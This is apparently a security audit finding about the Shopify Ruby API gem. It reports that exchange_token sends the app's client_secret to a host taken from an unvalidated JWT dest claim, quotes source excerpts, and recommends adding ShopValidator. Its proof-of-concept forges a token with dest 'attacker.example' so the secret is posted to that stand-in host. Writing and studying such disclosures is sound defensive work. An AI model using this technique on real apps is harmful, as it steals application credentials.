### Title
`TokenExchange.exchange_token` sends the app's `client_secret` to an unvalidated host derived from the JWT `dest` claim - ([File: lib/shopify_api/auth/token_exchange.rb])

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` builds the HTTP request host for the `/admin/oauth/access_token` call directly from the session token's `dest` claim, without ever passing it through `Utils::ShopValidator.sanitize!`. Every other OAuth entry point in the gem that builds a request host from caller/token-supplied shop input (`ClientCredentials.client_credentials`, `TokenExchange.migrate_to_expiring_token`) validates the value against `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` first. `exchange_token` is the odd one out, and it is also the one that POSTs `client_secret` in the request body.

### Finding Description
In `lib/shopify_api/auth/token_exchange.rb`: [1](#0-0) 

```ruby
jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
dest_shop = jwt_payload.shop
...
shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
body = {
  client_id: ShopifyAPI::Context.api_key,
  client_secret: ShopifyAPI::Context.api_secret_key,
  ...
}
client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

`jwt_payload.shop` is simply `@dest.gsub("https://", "")` [2](#0-1) , taken verbatim from the JWT's `dest` claim, with no domain allow-listing. `Clients::HttpClient` then uses `session.shop` directly to build the request URI: `@base_uri = "https://#{api_host || session.shop}"` [3](#0-2) . So whatever value ends up in `dest_shop` becomes the host that receives `client_id`/`client_secret` in the POST body.

Compare this to the sibling methods that build the same kind of request:
- `ClientCredentials.client_credentials` calls `Utils::ShopValidator.sanitize!(shop)` before constructing the session/host [4](#0-3) .
- `TokenExchange.migrate_to_expiring_token` does the same [5](#0-4) .

`ShopValidator.sanitize!` restricts the resulting host to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) [6](#0-5) . `exchange_token` skips this step entirely for the value that actually determines where the request (and the `client_secret`) is sent.

The security of `exchange_token` therefore rests entirely on the JWT signature check being an implicit proof that `dest` is a legitimate Shopify-issued domain. `JwtPayload` validates the signature with `Context.api_secret_key`, and if that fails, retries with `Context.old_api_secret_key` [7](#0-6) . `old_api_secret_key` exists specifically as a rotation mechanism for when the *current* key needs to be replaced (rotated out, typically because of compromise/leak) — this is the exact designed-for scenario in which a party other than Shopify may be in possession of a valid signing secret for a currently-configured key. During that rotation window, a token signed with the old secret — with an arbitrary `dest` value chosen by whoever holds that secret — passes `JwtPayload` verification, and its `dest` value flows unchecked into the host used for the client_secret POST, unlike every other path in the gem.

This breaks the equality the gem should enforce: `host validated by ShopValidator` == `host that receives client_id/client_secret`. In `exchange_token`, the left side is empty (no validation at all) while the right side is attacker-influenceable through the `dest` claim.

### Impact Explanation
This matches the High-impact category "SSRF with the app's credentials": the gem itself, not the host application, constructs the outbound request and unconditionally places `Context.api_secret_key` in that request's body, sent to a host taken from unvalidated token content. If reached via a rotation-compromised old secret, `client_secret` (and `client_id`) are exfiltrated to an attacker-controlled endpoint.

### Likelihood Explanation
Requires a currently-configured `old_api_secret_key` (a supported, documented feature for credential rotation) to have been retained past the point it was known/compromised, which is exactly the rotation grace-period scenario the feature is meant to cover safely. Given that condition, exploitation is a single call with a self-crafted token — no other privilege needed.

### Recommendation
Validate `dest_shop` with `Utils::ShopValidator.sanitize!` (as done in `client_credentials` and `migrate_to_expiring_token`) before constructing `shop_session`/`Clients::HttpClient` in `TokenExchange.exchange_token`, and raise `Errors::InvalidShopError` if it is not a trusted Shopify domain.

### Proof of Concept
1. Configure `Context.old_api_secret_key` to an old key value `K_old` (rotation scenario), with current key `K_new`.
2. Assume `K_old` is known outside the app (the reason rotation was performed).
3. Craft `session_token = JWT.encode({aud: api_key, dest: "attacker.example", exp: ..., nbf: ..., iat: ..., jti: "x"}, K_old, "HS256")`.
4. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: session_token, requested_token_type: ...)`.
5. `JwtPayload.new` fails verification with `K_new`, falls back to `K_old`, succeeds, `dest_shop = "attacker.example"`.
6. `Clients::HttpClient` POSTs `{client_id, client_secret: K_... , grant_type, subject_token, ...}` to `https://attacker.example/admin/oauth`, leaking `client_id`/`client_secret` to the attacker's server.

### Citations

**File:** lib/shopify_api/auth/token_exchange.rb (L39-65)
```ruby
          # Validate the session token and use the shop from the token's `dest` claim
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop

          if shop
            ShopifyAPI::Logger.deprecated(
              "The `shop` parameter for `exchange_token` is deprecated and will be removed in v17. " \
                "The shop is now always taken from the session token's `dest` claim.",
              "17.0.0",
            )
          end

          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: session_token,
            subject_token_type: ID_TOKEN_TYPE,
            requested_token_type: requested_token_type.serialize,
          }

          if requested_token_type == RequestedTokenType::OFFLINE_ACCESS_TOKEN
            body.merge!({ expiring: ShopifyAPI::Context.expiring_offline_access_tokens ? 1 : 0 })
          end

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/token_exchange.rb (L97-104)
```ruby
        def migrate_to_expiring_token(shop:, non_expiring_offline_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/jwt_payload.rb (L24-31)
```ruby
      def initialize(token)
        payload_hash = begin
          decode_token(token, Context.api_secret_key)
        rescue ShopifyAPI::Errors::InvalidJwtTokenError
          raise unless Context.old_api_secret_key

          decode_token(token, T.must(Context.old_api_secret_key))
        end
```

**File:** lib/shopify_api/auth/jwt_payload.rb (L47-50)
```ruby
      sig { returns(String) }
      def shop
        @dest.gsub("https://", "")
      end
```

**File:** lib/shopify_api/clients/http_client.rb (L16-19)
```ruby
        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/auth/client_credentials.rb (L19-26)
```ruby
        def client_credentials(shop:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/utils/shop_validator.rb (L9-18)
```ruby
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )
```
